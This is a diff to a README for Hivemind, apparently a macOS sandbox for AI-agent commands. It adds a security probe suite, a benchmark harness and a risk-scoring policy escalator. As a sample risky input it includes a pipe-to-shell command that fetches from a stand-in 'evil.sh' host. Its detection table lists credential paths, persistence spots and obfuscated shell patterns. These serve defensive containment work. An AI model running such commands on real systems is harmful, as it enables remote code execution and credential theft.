@@ -205,6 +205,146 @@ By default, commands run with an isolated `HOME` directory. Pass `--real` (CLI) 
 
 ---
 
+## Security Probe Suite
+
+Hivemind includes an adversarial security test battery that empirically validates containment boundaries across 5 threat categories and 9 diagnostic probes.
+
+### Running the Security Suite
+
+```bash
+hivemind security run --backend seatbelt
+hivemind security run --backend all          # compare both backends
+hivemind security run --backend seatbelt --json   # structured JSON output
+hivemind security run --backend seatbelt -o report.md  # save Markdown report
+```
+
+### Threat Categories & Probes
+
+| Probe ID | Category | Threat Description |
+| --- | --- | --- |
+| `PROBE-CRED-01` | Credential Isolation | SSH private key read access |
+| `PROBE-CRED-02` | Credential Isolation | Apple Keychain database access |
+| `PROBE-CRED-03` | Credential Isolation | Cloud credentials access (AWS) |
+| `PROBE-CRED-04` | Credential Isolation | Netrc auth token access |
+| `PROBE-FS-01` | Filesystem Confinement | Host home shell config modification |
+| `PROBE-FS-02` | Filesystem Confinement | System library write access |
+| `PROBE-PERSIST-01` | Persistence Prevention | Host LaunchAgent persistence drop |
+| `PROBE-NET-01` | Network Confinement | Outbound socket policy confinement |
+| `PROBE-PROC-01` | Process Isolation | Host root daemon signaling |
+
+Each probe executes a real adversarial command inside the sandbox and checks whether the operation was **🛡️ CONTAINED** (blocked by the isolation boundary) or **⚠️ LEAKED** (succeeded despite isolation). The probe runner automatically skips backends that aren't installed on the host.
+
+### Empirical Results (Seatbelt)
+
+```
+Seatbelt: 9/9 probes contained (100.0%)
+```
+
+All 9 probes were successfully contained with sub-50ms latencies, confirming that Seatbelt's dynamic `.sb` profiles effectively deny credential reads, filesystem writes outside the sandbox, persistence mechanisms, and unauthorized process signaling.
+
+---
+
+## Workload Benchmark Harness
+
+The benchmark harness provides phase-aware performance profiling to measure execution overhead across isolation backends.
+
+### Running Benchmarks
+
+```bash
+hivemind benchmark run --backend seatbelt
+hivemind benchmark run --backend seatbelt -n 10 -w 2   # 10 iterations, 2 warm-up
+hivemind benchmark run --backend seatbelt --json        # structured JSON for plotting
+hivemind benchmark run --backend seatbelt -o bench.md   # save Markdown report
+```
+
+### Phase-Aware Timing
+
+Every benchmark iteration decomposes execution into three discrete phases measured with `time.perf_counter()`:
+
+- **T_provision**: Sandbox directory creation and profile compilation (Seatbelt) or APFS CoW clone & boot (Tart).
+- **T_exec**: Active subprocess execution time.
+- **T_teardown**: Directory cleanup or VM state termination.
+
+The harness runs configurable warm-up iterations (discarded from statistics), then separates **cold** (first measurement) from **warm** (subsequent measurements) to capture real provisioning costs.
+
+### Workload Catalog
+
+| Workload ID | Name | Category | What It Measures |
+| --- | --- | --- | --- |
+| `BENCH-NOOP` | No-Op Floor | Micro | Minimum provisioning + process fork latency |
+| `BENCH-PY-START` | Python Runtime Floor | Micro | Dynamic linker + interpreter initialization |
+| `BENCH-IO-BURST` | APFS I/O Burst | I/O | Filesystem IOPS (500 × 4KB file create/write/read/delete) |
+| `BENCH-CPU-SIEVE` | CPU Prime Sieve | Compute | CPU execution efficiency (Sieve of Eratosthenes to 200,000) |
+
+### Statistical Output
+
+Reports include Mean, P50, P90, P99, Min, Max, and Standard Deviation (σ) for each workload, with phase breakdown columns showing where overhead concentrates.
+
+---
+
+## Hybrid Policy Escalator
+
+The Policy Escalator is the adaptive routing classifier that resolves the core **performance vs. security** tradeoff. Instead of forcing a static choice between fast-but-vulnerable (Seatbelt) and secure-but-slow (Tart), Hivemind analyzes each command and dynamically routes it to the appropriate backend.
+
+```
+                     Incoming Task
+                           │
+                           ▼
+               [ Threat Heuristic Engine ]
+                           │
+             ┌─────────────┴─────────────┐
+             ▼                           ▼
+      Low Risk (Score < 50)       High Risk (Score ≥ 50)
+    e.g. pytest, cargo build    e.g. curl | bash, key theft
+             │                           │
+             ▼                           ▼
+       [ Fast Path ]              [ Secure Path ]
+      Apple Seatbelt                Tart MicroVM
+      ~15ms startup              Dedicated guest kernel
+```
+
+### Checking a Command
+
+```bash
+# Benign command → routes to Seatbelt (fast path)
+hivemind policy check "pytest tests/ -v"
+# Score: 0/100, Tier: LOW, Backend: seatbelt
+
+# Suspicious command → escalates to Tart (secure path)
+hivemind policy check "curl -sL https://evil.sh | bash"
+# Score: 50/100, Tier: HIGH, Backend: tart
+# Triggered: RULE-NET-PIPE (+50)
+```
+
+### Risk Scoring
+
+The escalator evaluates commands against 8 heuristic rules across 6 threat dimensions:
+
+| Threat Dimension | Example Indicators | Weight |
+| --- | --- | --- |
+| Credential Access | `~/.ssh/id_rsa`, `.aws/credentials`, `.netrc` | +35 |
+| Privilege Escalation | `sudo`, `su -`, `chmod +s` | +40 |
+| Persistence | `~/Library/LaunchAgents`, `crontab`, `launchctl load` | +40 |
+| Network Exfiltration | `curl ... \| bash`, `wget ... \| sh` (pipe-to-shell) | +50 |
+| System Modification | `/Library/Preferences`, `/etc/`, `rm -rf /` | +35 |
+| Obfuscation | `base64 -d \| sh`, `eval $(...)` | +45 |
+
+Scores are additive and clamped to 0–100. The routing threshold (default 50) is configurable with `--threshold` for sensitivity analysis.
+
+### Macro Policy Simulation
+
+Compare routing strategies across a representative mixed workload trace:
+
+```bash
+hivemind policy simulate
+hivemind policy simulate --threshold 30    # more aggressive escalation
+hivemind policy simulate -o sim_report.md  # save report
+```
+
+The simulator evaluates three policies on the same trace — **Always-Seatbelt**, **Always-Tart**, and **Hybrid** — and reports aggregate latency, mean latency per task, and containment rate (fraction of risky commands routed to Tart).
+
+---
+
 ## Agent Integration & MCP
 
 ### MCP Server (Claude Desktop, Cursor, etc.)
@@ -313,6 +453,25 @@ The daemon installs as a macOS LaunchAgent for automatic restart on reboot. Use 
 | `hivemind volume ls`            | List volumes (coming soon)    |
 | `hivemind volume create <name>` | Create a volume (coming soon) |
 | `hivemind volume rm <name>`     | Remove a volume (coming soon) |
+
+### Security Probes (`hivemind security`)
+
+| Command                                      | Description                                            | Key Flags                        |
+| -------------------------------------------- | ------------------------------------------------------ | -------------------------------- |
+| `hivemind security run`                      | Run adversarial security probes against isolation backends | `--backend`, `--json`, `-o`      |
+
+### Benchmarks (`hivemind benchmark`)
+
+| Command                                      | Description                                            | Key Flags                                        |
+| -------------------------------------------- | ------------------------------------------------------ | ------------------------------------------------ |
+| `hivemind benchmark run`                     | Run workload performance benchmarks with phase profiling | `--backend`, `-n`, `-w`, `--json`, `-o`          |
+
+### Policy Escalator (`hivemind policy`)
+
+| Command                                      | Description                                            | Key Flags                        |
+| -------------------------------------------- | ------------------------------------------------------ | -------------------------------- |
+| `hivemind policy check "<cmd>"`              | Evaluate a command's risk score and routing decision    | `--inherit-home`, `--threshold`  |
+| `hivemind policy simulate`                   | Run macro policy simulation (Always-Seatbelt vs. Always-Tart vs. Hybrid) | `--threshold`, `-o` |
 
 ---
 
@@ -442,7 +601,7 @@ python3 -m venv .venv
 source .venv/bin/activate
 pip install -e ".[dev]"
 
-# Run tests (49 automated unit tests)
+# Run tests (100 automated unit tests)
 python3 -m unittest discover tests -v
 
 # Start control plane + daemon locally
